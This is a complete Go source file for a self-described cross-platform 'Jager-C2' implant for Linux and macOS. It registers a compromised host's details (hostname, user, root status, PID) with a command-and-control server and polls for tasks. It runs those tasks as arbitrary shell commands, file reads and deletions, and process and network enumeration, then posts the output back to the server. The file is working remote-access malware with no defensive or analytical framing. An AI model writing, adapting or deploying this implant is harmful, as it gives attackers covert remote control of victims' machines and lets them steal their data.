// Cross-platform Jager-C2 implant (Linux/macOS) — JSON protocol parity with Windows implant.
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

type config struct {
	C2URL        string
	CheckinPath  string
	RegisterPath string
	ResultPath   string
	UserAgent    string
	ImplantID    string
	SleepSec     int
	JitterPct    int
}

func main() {
	cfg := config{
		C2URL:        env("JAGER_URL", "http://127.0.0.1:8443"),
		CheckinPath:  env("JAGER_CHECKIN", "/api/v1/checkin"),
		RegisterPath: env("JAGER_REGISTER", "/api/v1/register"),
		ResultPath:   env("JAGER_RESULT", "/api/v1/result"),
		UserAgent:    env("JAGER_UA", "Mozilla/5.0 (compatible; Jager/1.0)"),
		ImplantID:    env("JAGER_IMPLANT_ID", fmt.Sprintf("%s-%d", hostname(), time.Now().Unix())),
		SleepSec:     5,
		JitterPct:    20,
	}
	if !register(cfg) {
		os.Exit(1)
	}
	for {
		tasks := checkin(cfg)
		for _, t := range tasks {
			runTask(cfg, t)
		}
		time.Sleep(time.Duration(cfg.SleepSec) * time.Second)
	}
}

func env(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

func hostname() string {
	h, _ := os.Hostname()
	if h == "" {
		return "unknown"
	}
	return h
}

func postJSON(cfg config, path string, body any) ([]byte, int) {
	b, _ := json.Marshal(body)
	req, _ := http.NewRequest(http.MethodPost, cfg.C2URL+path, bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", cfg.UserAgent)
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	return data, resp.StatusCode
}

func register(cfg config) bool {
	payload := map[string]any{
		"implant_id":    cfg.ImplantID,
		"hostname":      hostname(),
		"username":      env("USER", "unknown"),
		"domain":        env("DOMAIN", "WORKGROUP"),
		"os":            runtime.GOOS,
		"arch":          runtime.GOARCH,
		"pid":           os.Getpid(),
		"process_name":  os.Args[0],
		"elevated":      os.Geteuid() == 0,
		"internal_ip":   "127.0.0.1",
		"os_version":    runtime.GOOS,
		"build_id":      "implant-go",
	}
	_, code := postJSON(cfg, cfg.RegisterPath, payload)
	return code == 200
}

type task struct {
	ID   string `json:"id"`
	Type int    `json:"type"`
	Data string `json:"data"`
}

func checkin(cfg config) []task {
	data, code := postJSON(cfg, cfg.CheckinPath, map[string]string{"id": cfg.ImplantID})
	if code != 200 {
		return nil
	}
	var resp struct {
		Tasks []task `json:"tasks"`
	}
	_ = json.Unmarshal(data, &resp)
	return resp.Tasks
}

func taskDataString(raw string) string {
	if raw == "" {
		return raw
	}
	if dec, err := base64.StdEncoding.DecodeString(raw); err == nil && len(dec) > 0 {
		return string(dec)
	}
	return raw
}

func runTask(cfg config, t task) {
	var out []byte
	var errMsg string
	cmdData := taskDataString(t.Data)
	switch t.Type {
	case 1:
		if sec, e := parseInt(cmdData); e == nil && sec > 0 {
			cfg.SleepSec = sec
		}
	case 2:
		os.Exit(0)
	case 10, 11, 12:
		out, errMsg = runShell(cmdData)
	case 20:
		path := cmdData
		if path == "" {
			path = "."
		}
		out, _ = exec.Command("ls", "-la", path).CombinedOutput()
	case 21:
		if cmdData != "" {
			_ = os.Chdir(cmdData)
		}
		out = []byte("ok")
	case 22:
		wd, _ := os.Getwd()
		out = []byte(wd)
	case 23:
		out, _ = os.ReadFile(cmdData)
	case 26:
		err := os.Remove(cmdData)
		if err != nil {
			errMsg = err.Error()
		} else {
			out = []byte("removed")
		}
	case 27:
		err := os.MkdirAll(cmdData, 0o755)
		if err != nil {
			errMsg = err.Error()
		} else {
			out = []byte("created")
		}
	case 40:
		out, _ = exec.Command("ps", "aux").CombinedOutput()
	case 50:
		out, _ = exec.Command("ip", "addr").CombinedOutput()
	case 51:
		out, _ = exec.Command("ss", "-tunap").CombinedOutput()
	default:
		errMsg = fmt.Sprintf("unsupported task type %d on %s", t.Type, runtime.GOOS)
	}
	sendResult(cfg, t.ID, out, errMsg)
}

func parseInt(s string) (int, error) {
	var n int
	_, err := fmt.Sscanf(s, "%d", &n)
	return n, err
}

func runShell(cmd string) ([]byte, string) {
	if cmd == "" {
		return nil, "empty command"
	}
	c := exec.Command("sh", "-c", cmd)
	out, err := c.CombinedOutput()
	if err != nil {
		return out, err.Error()
	}
	return out, ""
}

func sendResult(cfg config, taskID string, out []byte, errMsg string) {
	payload := map[string]any{
		"task_id": taskID,
		"output":  out,
		"error":   errMsg,
	}
	postJSON(cfg, cfg.ResultPath, payload)
}
